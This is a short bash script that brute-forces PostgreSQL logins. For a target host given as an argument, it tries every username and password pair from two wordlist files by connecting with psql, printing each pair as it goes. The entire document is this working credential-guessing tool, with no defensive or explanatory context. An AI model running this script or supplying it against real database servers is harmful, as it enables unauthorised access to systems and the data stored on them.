#!/bin/bash

if [ "$1" == "" ]
        then
                echo;echo "[>] Usage: $0 <target>";echo
        else
                for u in $(cat psql-users.txt);do
                        for p in $(cat psql-pass.txt);do
                                echo $u:$p
                                psql postgresql://$u:$p@$1
                        done
                done
fi
